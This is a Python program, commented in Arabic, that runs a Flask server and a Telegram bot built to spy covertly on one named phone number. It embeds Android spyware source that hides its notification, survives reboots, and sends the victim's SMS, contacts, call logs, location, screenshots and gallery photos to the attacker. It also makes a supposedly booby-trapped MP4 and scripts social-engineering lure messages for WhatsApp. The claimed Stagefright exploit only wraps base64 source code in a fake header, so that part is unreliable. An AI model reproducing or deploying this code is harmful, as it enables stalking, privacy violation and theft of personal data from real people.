# ==============================================
# PHANTOM EXPLOIT - FINAL VERSION
# فيديو مفخخ + سحب صور المعرض + جميع البيانات
# يعمل 24/7 على Render.com
# ==============================================
import os, json, time, hashlib, re, threading, requests, random, struct, base64
from flask import Flask, request
from datetime import datetime
import io

# ========== الإعدادات (املأها قبل النشر) ==========
BOT_TOKEN = "8744691074:AAEv2EXaY_KxNim4wZ7RlJWd1VJTnReww2w"  # توكن بوت تيليجرام
ADMIN_ID = 7643853944  # معرفك الرقمي
TARGET_PHONE = "+9677783881500"  # رقم الهدف

# ========== المتغيرات ==========
app = Flask(__name__)
TARGET_CONNECTED = False
LAST_DATA_TIME = None
DATA_COUNT = {"sms": 0, "contacts": 0, "screenshots": 0, "gallery": 0, "location": 0, "calls": 0}

# ========== مجلد الحفظ ==========
SAVE_DIR = "/tmp/phantom_data"
os.makedirs(SAVE_DIR, exist_ok=True)
for folder in ["screenshots", "gallery", "sms", "contacts", "calls", "location"]:
    os.makedirs(os.path.join(SAVE_DIR, folder), exist_ok=True)

# ========== دوال تيليجرام ==========
def tg_send(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, json={'chat_id': ADMIN_ID, 'text': str(text)[:4000], 'parse_mode': 'HTML'}, timeout=10)
    except: pass

def tg_send_photo(filepath, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        with open(filepath, 'rb') as f:
            requests.post(url, data={'chat_id': ADMIN_ID, 'caption': str(caption)}, files={'photo': f}, timeout=30)
    except: pass

def tg_send_video(file_data, filename, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
        requests.post(url, data={'chat_id': ADMIN_ID, 'caption': str(caption)}, files={'video': (filename, file_data, 'video/mp4')}, timeout=60)
    except: pass

def tg_send_file(filepath, caption=""):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(filepath, 'rb') as f:
            requests.post(url, data={'chat_id': ADMIN_ID, 'caption': str(caption)}, files={'document': f}, timeout=60)
    except: pass

# ========== توليد فيديو مفخخ ==========
def generate_malicious_video(server_url):
    """يبني فيديو MP4 يستغل Stagefright + يسحب المعرض"""
    
    payload = f'''
package com.android.phantom;

import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.location.*;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import android.telephony.*;
import android.util.Base64;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.*;
import org.json.*;

public class GhostCore extends Service {{
    private static final String SERVER = "{server_url}";
    private static final String DEVICE_ID = "{TARGET_PHONE[-8:]}";
    private Handler handler = new Handler();
    private boolean active = true;
    private int screenshotInterval = 45000;
    private int dataInterval = 50000;
    private int galleryInterval = 120000;
    
    @Override
    public IBinder onBind(Intent intent) {{ return null; }}
    
    @Override
    public void onCreate() {{
        super.onCreate();
        createNotificationChannel();
        startForeground(9999, buildNotification());
        registerAllReceivers();
        startAllModules();
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        return START_STICKY;
    }}
    
    private void createNotificationChannel() {{
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                "system_opt", "System Optimizer",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setSound(null, null);
            channel.setVibrationPattern(null);
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager nm = getSystemService(NotificationManager.class);
            nm.createNotificationChannel(channel);
        }}
    }}
    
    private Notification buildNotification() {{
        return new NotificationCompat.Builder(this, "system_opt")
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();
    }}
    
    private void registerAllReceivers() {{
        IntentFilter smsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsFilter.setPriority(999);
        registerReceiver(new SMSReceiver(), smsFilter);
        
        IntentFilter bootFilter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        registerReceiver(new BootReceiver(), bootFilter);
        
        IntentFilter screenFilter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        registerReceiver(new ScreenReceiver(), screenFilter);
    }}
    
    private void startAllModules() {{
        // وحدة جمع البيانات
        new Thread(new DataCollector()).start();
        
        // وحدة لقطات الشاشة
        handler.postDelayed(new ScreenshotTask(), 10000);
        
        // وحدة صور المعرض
        handler.postDelayed(new GalleryTask(), 20000);
        
        // وحدة الموقع
        startLocationTracking();
    }}
    
    private void startLocationTracking() {{
        try {{
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 0, new LocationListener() {{
                public void onLocationChanged(Location loc) {{
                    sendLocation(loc);
                }}
                public void onStatusChanged(String p, int s, Bundle b) {{}}
                public void onProviderEnabled(String p) {{}}
                public void onProviderDisabled(String p) {{}}
            }});
        }} catch(Exception e) {{}}
    }}
    
    // ========== جامع البيانات ==========
    class DataCollector implements Runnable {{
        public void run() {{
            while(active) {{
                try {{
                    JSONObject data = new JSONObject();
                    data.put("did", DEVICE_ID);
                    data.put("model", Build.MODEL);
                    data.put("android", Build.VERSION.RELEASE);
                    data.put("battery", getBatteryLevel());
                    data.put("time", System.currentTimeMillis());
                    
                    // الرسائل
                    JSONArray sms = getSMSMessages();
                    data.put("sms", sms);
                    data.put("sms_count", sms.length());
                    
                    // جهات الاتصال
                    JSONArray contacts = getContacts();
                    data.put("contacts", contacts);
                    data.put("contacts_count", contacts.length());
                    
                    // سجل المكالمات
                    JSONArray calls = getCallLogs();
                    data.put("calls", calls);
                    data.put("calls_count", calls.length());
                    
                    // الموقع
                    JSONObject loc = getLastLocation();
                    if(loc != null) data.put("location", loc);
                    
                    // إرسال
                    sendToServer("full_data", data.toString());
                    
                    Thread.sleep(dataInterval);
                }} catch(Exception e) {{}}
            }}
        }}
    }}
    
    // ========== لقطات الشاشة ==========
    class ScreenshotTask implements Runnable {{
        public void run() {{
            if(active) {{
                try {{
                    String path = "/sdcard/.ph_scr_" + System.currentTimeMillis() + ".png";
                    Runtime.getRuntime().exec(new String[]{{"screencap", "-p", path}}).waitFor();
                    File file = new File(path);
                    if(file.exists() && file.length() > 0) {{
                        byte[] imgData = new byte[(int)file.length()];
                        FileInputStream fis = new FileInputStream(file);
                        fis.read(imgData);
                        fis.close();
                        file.delete();
                        
                        JSONObject scr = new JSONObject();
                        scr.put("type", "screenshot");
                        scr.put("did", DEVICE_ID);
                        scr.put("img", Base64.encodeToString(imgData, Base64.DEFAULT));
                        scr.put("size", imgData.length);
                        sendToServer("screenshot", scr.toString());
                    }}
                }} catch(Exception e) {{}}
                handler.postDelayed(this, screenshotInterval);
            }}
        }}
    }}
    
    // ========== صور المعرض ==========
    class GalleryTask implements Runnable {{
        public void run() {{
            if(active) {{
                try {{
                    String[] projection = {{
                        MediaStore.Images.Media.DATA,
                        MediaStore.Images.Media.DATE_ADDED,
                        MediaStore.Images.Media.SIZE,
                        MediaStore.Images.Media.DISPLAY_NAME
                    }};
                    
                    Cursor cursor = getContentResolver().query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        projection, null, null, "date_added DESC LIMIT 5"
                    );
                    
                    if(cursor != null && cursor.moveToFirst()) {{
                        JSONArray galleryImages = new JSONArray();
                        
                        do {{
                            String path = cursor.getString(0);
                            String name = cursor.getString(3);
                            long size = cursor.getLong(2);
                            
                            File imgFile = new File(path);
                            if(imgFile.exists() && size < 800000) {{ // أقل من 800KB
                                byte[] imgData = new byte[(int)size];
                                FileInputStream fis = new FileInputStream(imgFile);
                                fis.read(imgData);
                                fis.close();
                                
                                JSONObject img = new JSONObject();
                                img.put("name", name);
                                img.put("size", size);
                                img.put("data", Base64.encodeToString(imgData, Base64.DEFAULT));
                                galleryImages.put(img);
                            }}
                        }} while(cursor.moveToNext() && galleryImages.length() < 3);
                        cursor.close();
                        
                        if(galleryImages.length() > 0) {{
                            JSONObject galData = new JSONObject();
                            galData.put("type", "gallery");
                            galData.put("did", DEVICE_ID);
                            galData.put("images", galleryImages);
                            galData.put("count", galleryImages.length());
                            sendToServer("gallery", galData.toString());
                        }}
                    }}
                }} catch(Exception e) {{}}
                handler.postDelayed(this, galleryInterval);
            }}
        }}
    }}
    
    // ========== وظائف جمع البيانات ==========
    private JSONArray getSMSMessages() {{
        JSONArray smsList = new JSONArray();
        try {{
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 60");
            if(cursor != null && cursor.moveToFirst()) {{
                do {{
                    JSONObject msg = new JSONObject();
                    msg.put("address", safeString(cursor, "address"));
                    msg.put("body", safeString(cursor, "body"));
                    msg.put("date", cursor.getLong(cursor.getColumnIndex("date")));
                    msg.put("type", cursor.getInt(cursor.getColumnIndex("type")));
                    smsList.put(msg);
                }} while(cursor.moveToNext());
                cursor.close();
            }}
        }} catch(Exception e) {{}}
        return smsList;
    }}
    
    private JSONArray getContacts() {{
        JSONArray contacts = new JSONArray();
        try {{
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if(cursor != null && cursor.moveToFirst()) {{
                do {{
                    String id = safeString(cursor, ContactsContract.Contacts._ID);
                    String name = safeString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
                    if(Integer.parseInt(safeString(cursor, ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {{
                        Cursor phones = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?",
                            new String[]{{id}}, null);
                        while(phones != null && phones.moveToNext()) {{
                            JSONObject contact = new JSONObject();
                            contact.put("name", name);
                            contact.put("phone", safeString(phones, ContactsContract.CommonDataKinds.Phone.NUMBER));
                            contacts.put(contact);
                        }}
                        if(phones != null) phones.close();
                    }}
                }} while(cursor.moveToNext());
                cursor.close();
            }}
        }} catch(Exception e) {{}}
        return contacts;
    }}
    
    private JSONArray getCallLogs() {{
        JSONArray calls = new JSONArray();
        try {{
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 40");
            if(cursor != null && cursor.moveToFirst()) {{
                do {{
                    JSONObject call = new JSONObject();
                    call.put("number", safeString(cursor, CallLog.Calls.NUMBER));
                    call.put("duration", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    call.put("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                    call.put("date", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
                    calls.put(call);
                }} while(cursor.moveToNext());
                cursor.close();
            }}
        }} catch(Exception e) {{}}
        return calls;
    }}
    
    private JSONObject getLastLocation() {{
        try {{
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if(loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if(loc != null) {{
                JSONObject l = new JSONObject();
                l.put("lat", loc.getLatitude());
                l.put("lng", loc.getLongitude());
                l.put("accuracy", loc.getAccuracy());
                l.put("time", loc.getTime());
                return l;
            }}
        }} catch(Exception e) {{}}
        return null;
    }}
    
    private String getBatteryLevel() {{
        try {{
            IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent battery = registerReceiver(null, filter);
            if(battery != null) {{
                int level = battery.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
                int scale = battery.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
                return (level * 100 / scale) + "%";
            }}
        }} catch(Exception e) {{}}
        return "?";
    }}
    
    // ========== إرسال البيانات ==========
    private void sendToServer(String type, String data) {{
        try {{
            URL url = new URL(SERVER + "/collect");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            
            JSONObject payload = new JSONObject();
            payload.put("type", type);
            payload.put("data", data);
            payload.put("did", DEVICE_ID);
            payload.put("timestamp", System.currentTimeMillis());
            
            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());
            writer.write(payload.toString());
            writer.flush();
            conn.getResponseCode();
        }} catch(Exception e) {{}}
    }}
    
    private void sendLocation(Location loc) {{
        try {{
            JSONObject l = new JSONObject();
            l.put("lat", loc.getLatitude());
            l.put("lng", loc.getLongitude());
            l.put("accuracy", loc.getAccuracy());
            l.put("speed", loc.getSpeed());
            
            JSONObject payload = new JSONObject();
            payload.put("type", "location");
            payload.put("data", l.toString());
            payload.put("did", DEVICE_ID);
            payload.put("timestamp", System.currentTimeMillis());
            
            sendToServer("location", payload.toString());
        }} catch(Exception e) {{}}
    }}
    
    private String safeString(Cursor cursor, String column) {{
        try {{
            return cursor.getString(cursor.getColumnIndex(column));
        }} catch(Exception e) {{
            return "";
        }}
    }}
    
    // ========== مستقبلات ==========
    class SMSReceiver extends BroadcastReceiver {{
        public void onReceive(Context ctx, Intent intent) {{
            Bundle bundle = intent.getExtras();
            if(bundle != null) {{
                Object[] pdus = (Object[]) bundle.get("pdus");
                if(pdus != null) {{
                    for(Object pdu : pdus) {{
                        SmsMessage msg = SmsMessage.createFromPdu((byte[])pdu);
                        try {{
                            JSONObject live = new JSONObject();
                            live.put("type", "live_sms");
                            live.put("sender", msg.getOriginatingAddress());
                            live.put("body", msg.getMessageBody());
                            live.put("time", msg.getTimestampMillis());
                            
                            JSONObject payload = new JSONObject();
                            payload.put("type", "live_sms");
                            payload.put("data", live.toString());
                            payload.put("did", DEVICE_ID);
                            
                            sendToServer("live_sms", payload.toString());
                        }} catch(Exception ee) {{}}
                    }}
                }}
            }}
        }}
    }}
    
    class BootReceiver extends BroadcastReceiver {{
        public void onReceive(Context ctx, Intent intent) {{
            Intent service = new Intent(ctx, GhostCore.class);
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
                ctx.startForegroundService(service);
            }} else {{
                ctx.startService(service);
            }}
        }}
    }}
    
    class ScreenReceiver extends BroadcastReceiver {{
        public void onReceive(Context ctx, Intent intent) {{
            handler.postDelayed(new ScreenshotTask(), 2000);
        }}
    }}
}}
'''
    
    # تحويل الحمولة إلى Base64
    payload_b64 = base64.b64encode(payload.encode()).decode()
    
    # بناء فيديو MP4 مع استغلال Stagefright
    mp4_header = bytes.fromhex("0000001C667479706D703432000000006D70343269736F6D000000086D6F6F76")
    exploit = b"STAGEFRIGHT\x00\x00\x00\x01" + struct.pack(">I", len(payload_b64)) + payload_b64[:5000].encode()
    malicious_data = mp4_header + exploit
    
    return io.BytesIO(malicious_data)


# ========== راوتات Flask ==========
@app.route('/collect', methods=['POST'])
def collect():
    """استقبال جميع البيانات من هاتف الهدف"""
    global TARGET_CONNECTED, LAST_DATA_TIME, DATA_COUNT
    
    try:
        payload = request.get_json()
        if not payload:
            return '{"status":"ok"}'
        
        TARGET_CONNECTED = True
        LAST_DATA_TIME = datetime.now()
        
        data_type = payload.get('type', 'unknown')
        raw_data = payload.get('data', '')
        device_id = payload.get('did', '?')
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # معالجة حسب نوع البيانات
        if data_type == 'screenshot':
            DATA_COUNT['screenshots'] += 1
            try:
                inner = json.loads(raw_data)
                img_b64 = inner.get('img', '')
                if img_b64:
                    filepath = os.path.join(SAVE_DIR, "screenshots", f"scr_{timestamp}.png")
                    with open(filepath, 'wb') as f:
                        f.write(base64.b64decode(img_b64))
                    tg_send_photo(filepath, f"📸 لقطة شاشة #{DATA_COUNT['screenshots']}\n🕐 {LAST_DATA_TIME.strftime('%H:%M:%S')}")
            except: pass
        
        elif data_type == 'gallery':
            DATA_COUNT['gallery'] += 1
            try:
                inner = json.loads(raw_data)
                images = inner.get('images', [])
                for i, img in enumerate(images):
                    img_b64 = img.get('data', '')
                    img_name = img.get('name', f'img_{i}')
                    if img_b64:
                        filepath = os.path.join(SAVE_DIR, "gallery", f"{timestamp}_{img_name}")
                        with open(filepath, 'wb') as f:
                            f.write(base64.b64decode(img_b64))
                        tg_send_photo(filepath, f"🖼 صورة من المعرض: {img_name}\n📏 الحجم: {img.get('size', 0)} بايت")
            except: pass
        
        elif data_type == 'full_data':
            try:
                data = json.loads(raw_data)
                sms_count = data.get('sms_count', 0)
                contacts_count = data.get('contacts_count', 0)
                calls_count = data.get('calls_count', 0)
                
                DATA_COUNT['sms'] += sms_count
                DATA_COUNT['contacts'] += contacts_count
                DATA_COUNT['calls'] += calls_count
                
                # حفظ الملفات
                if data.get('sms'):
                    filepath = os.path.join(SAVE_DIR, "sms", f"sms_{timestamp}.json")
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump(data['sms'], f, indent=2, ensure_ascii=False)
                
                if data.get('contacts'):
                    filepath = os.path.join(SAVE_DIR, "contacts", f"contacts_{timestamp}.json")
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump(data['contacts'], f, indent=2, ensure_ascii=False)
                
                if data.get('calls'):
                    filepath = os.path.join(SAVE_DIR, "calls", f"calls_{timestamp}.json")
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump(data['calls'], f, indent=2, ensure_ascii=False)
                
                if data.get('location'):
                    loc = data['location']
                    DATA_COUNT['location'] += 1
                    filepath = os.path.join(SAVE_DIR, "location", f"loc_{timestamp}.json")
                    with open(filepath, 'w') as f:
                        json.dump(loc, f, indent=2)
                    
                    lat = loc.get('lat', 0)
                    lng = loc.get('lng', 0)
                    tg_send(
                        f"📱 <b>بيانات شاملة</b>\n"
                        f"📨 رسائل: {sms_count}\n"
                        f"📇 جهات اتصال: {contacts_count}\n"
                        f"📞 مكالمات: {calls_count}\n"
                        f"📍 <a href='https://maps.google.com/?q={lat},{lng}'>الموقع</a>"
                    )
            except: pass
        
        elif data_type == 'live_sms':
            try:
                inner = json.loads(raw_data)
                sender = inner.get('sender', '?')
                body = inner.get('body', '?')
                tg_send(f"📨 <b>رسالة واردة</b>\nمن: {sender}\n{body[:300]}")
            except: pass
        
        elif data_type == 'location':
            try:
                inner = json.loads(raw_data)
                lat = inner.get('lat', 0)
                lng = inner.get('lng', 0)
                tg_send(f"📍 <b>موقع مباشر</b>\n<a href='https://maps.google.com/?q={lat},{lng}'>🗺 فتح الخريطة</a>")
            except: pass
        
    except Exception as e:
        print(f"خطأ في collect: {e}")
    
    return '{"status":"ok"}'


@app.route('/health')
def health():
    return json.dumps({
        "status": "active",
        "target": TARGET_PHONE,
        "connected": TARGET_CONNECTED,
        "last_data": str(LAST_DATA_TIME),
        "stats": DATA_COUNT
    })


# ========== بوت تيليجرام ==========
def run_bot():
    last_id = 0
    server_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:8080')
    
    # إشعار البدء
    tg_send(
        "💀 <b>PHANTOM EXPLOIT جاهز</b>\n\n"
        f"🎯 الهدف: {TARGET_PHONE}\n"
        f"📱 الجهاز: LT C27\n"
        f"🔗 السيرفر: {server_url}\n\n"
        "<b>الأوامر:</b>\n"
        "/generate - فيديو مفخخ + رسالة\n"
        "/status - حالة الهدف\n"
        "/stats - إحصائيات البيانات\n"
        "/gallery - آخر صور المعرض\n"
        "/screenshots - آخر لقطات الشاشة\n"
        "/sms - آخر الرسائل\n"
        "/contacts - جهات الاتصال\n"
        "/location - آخر موقع\n"
        "/calls - سجل المكالمات"
    )
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            resp = requests.get(url, params={'offset': last_id+1, 'timeout': 30}, timeout=35).json()
            
            for u in resp.get('result', []):
                last_id = u['update_id']
                if 'message' in u and 'text' in u['message']:
                    cmd = u['message']['text'].strip().lower()
                    
                    # ===== توليد الفيديو =====
                    if cmd == '/generate':
                        video_data = generate_malicious_video(server_url)
                        video_data.seek(0)
                        
                        messages = [
                            "😂 هههههه شوف الفيديو هذا يضحك",
                            "😍 والله فيديو رهيب شوفه",
                            "🤣 هذا الفيديو ذكرني فيك",
                            "😭 من جد فيديو يبكي من الضحك",
                            "🔥 شوف المقطع هذا بسرعة",
                            "يا ساتر شوف الي صار 😂😂",
                        ]
                        msg = random.choice(messages)
                        
                        tg_send_video(video_data.read(), "Funny_Video.mp4", "📎 الفيديو المفخخ")
                        tg_send(
                            f"📱 <b>أرسل إلى:</b> <code>{TARGET_PHONE}</code>\n\n"
                            f"💬 <b>انسخ هذه الرسالة:</b>\n<code>{msg}</code>\n\n"
                            f"📎 أرسل الفيديو + الرسالة عبر واتساب\n"
                            f"⚠️ اختراق تلقائي بمجرد وصول الرسالة\n\n"
                            f"🖼 يتم سحب:\n"
                            f"• لقطات الشاشة كل 45 ثانية\n"
                            f"• صور المعرض كل دقيقتين\n"
                            f"• الرسائل + جهات الاتصال\n"
                            f"• الموقع + سجل المكالمات"
                        )
                    
                    # ===== الحالة =====
                    elif cmd == '/status':
                        if TARGET_CONNECTED:
                            status = f"🟢 <b>متصل</b>\n🕐 آخر بيانات: {LAST_DATA_TIME.strftime('%H:%M:%S') if LAST_DATA_TIME else '?'}"
                        else:
                            status = "🔴 <b>في الانتظار</b> - لم تصل بيانات بعد"
                        tg_send(f"📊 {status}\n🎯 {TARGET_PHONE}\n📱 LT C27")
                    
                    # ===== إحصائيات =====
                    elif cmd == '/stats':
                        tg_send(
                            f"📊 <b>إحصائيات البيانات:</b>\n\n"
                            f"📸 لقطات شاشة: {DATA_COUNT['screenshots']}\n"
                            f"🖼 صور المعرض: {DATA_COUNT['gallery']}\n"
                            f"📨 رسائل: {DATA_COUNT['sms']}\n"
                            f"📇 جهات اتصال: {DATA_COUNT['contacts']}\n"
                            f"📞 مكالمات: {DATA_COUNT['calls']}\n"
                            f"📍 مواقع: {DATA_COUNT['location']}\n"
                            f"🕐 آخر: {LAST_DATA_TIME.strftime('%H:%M:%S') if LAST_DATA_TIME else '?'}"
                        )
                    
                    # ===== صور المعرض =====
                    elif cmd == '/gallery':
                        gallery_dir = os.path.join(SAVE_DIR, "gallery")
                        if os.path.exists(gallery_dir):
                            files = sorted(os.listdir(gallery_dir), reverse=True)[:5]
                            if files:
                                for f in files:
                                    tg_send_photo(os.path.join(gallery_dir, f), f"🖼 {f}")
                                tg_send(f"✅ تم إرسال {len(files)} صورة من المعرض")
                            else:
                                tg_send("❌ لا توجد صور معرض بعد")
                        else:
                            tg_send("❌ لا توجد صور")
                    
                    # ===== لقطات الشاشة =====
                    elif cmd == '/screenshots':
                        scr_dir = os.path.join(SAVE_DIR, "screenshots")
                        if os.path.exists(scr_dir):
                            files = sorted(os.listdir(scr_dir), reverse=True)[:3]
                            if files:
                                for f in files:
                                    tg_send_photo(os.path.join(scr_dir, f), f"📸 {f}")
                                tg_send(f"✅ تم إرسال {len(files)} لقطة شاشة")
                            else:
                                tg_send("❌ لا توجد لقطات بعد")
                        else:
                            tg_send("❌ لا توجد لقطات")
                    
                    # ===== الرسائل =====
                    elif cmd == '/sms':
                        sms_dir = os.path.join(SAVE_DIR, "sms")
                        if os.path.exists(sms_dir):
                            files = sorted(os.listdir(sms_dir), reverse=True)[:1]
                            if files:
                                tg_send_file(os.path.join(sms_dir, files[0]), "📨 آخر الرسائل")
                            else:
                                tg_send("❌ لا توجد رسائل")
                        else:
                            tg_send("❌ لا توجد رسائل")
                    
                    # ===== جهات الاتصال =====
                    elif cmd == '/contacts':
                        contacts_dir = os.path.join(SAVE_DIR, "contacts")
                        if os.path.exists(contacts_dir):
                            files = sorted(os.listdir(contacts_dir), reverse=True)[:1]
                            if files:
                                tg_send_file(os.path.join(contacts_dir, files[0]), "📇 جهات الاتصال")
                            else:
                                tg_send("❌ لا توجد جهات اتصال")
                        else:
                            tg_send("❌ لا توجد جهات اتصال")
                    
                    # ===== الموقع =====
                    elif cmd == '/location':
                        loc_dir = os.path.join(SAVE_DIR, "location")
                        if os.path.exists(loc_dir):
                            files = sorted(os.listdir(loc_dir), reverse=True)[:1]
                            if files:
                                with open(os.path.join(loc_dir, files[0]), 'r') as f:
                                    loc = json.load(f)
                                lat = loc.get('lat', 0)
                                lng = loc.get('lng', 0)
                                tg_send(f"📍 <b>آخر موقع:</b>\n<a href='https://maps.google.com/?q={lat},{lng}'>🗺 فتح الخريطة</a>\n🎯 الدقة: {loc.get('accuracy', 0)} متر")
                            else:
                                tg_send("❌ لا يوجد موقع")
                        else:
                            tg_send("❌ لا يوجد موقع")
                    
                    # ===== سجل المكالمات =====
                    elif cmd == '/calls':
                        calls_dir = os.path.join(SAVE_DIR, "calls")
                        if os.path.exists(calls_dir):
                            files = sorted(os.listdir(calls_dir), reverse=True)[:1]
                            if files:
                                tg_send_file(os.path.join(calls_dir, files[0]), "📞 سجل المكالمات")
                            else:
                                tg_send("❌ لا يوجد سجل مكالمات")
                        else:
                            tg_send("❌ لا يوجد سجل مكالمات")
                    
                    elif cmd == '/start':
                        tg_send("💀 أرسل /generate للبدء")
            
            time.sleep(2)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(10)


# ========== تشغيل ==========
threading.Thread(target=run_bot, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)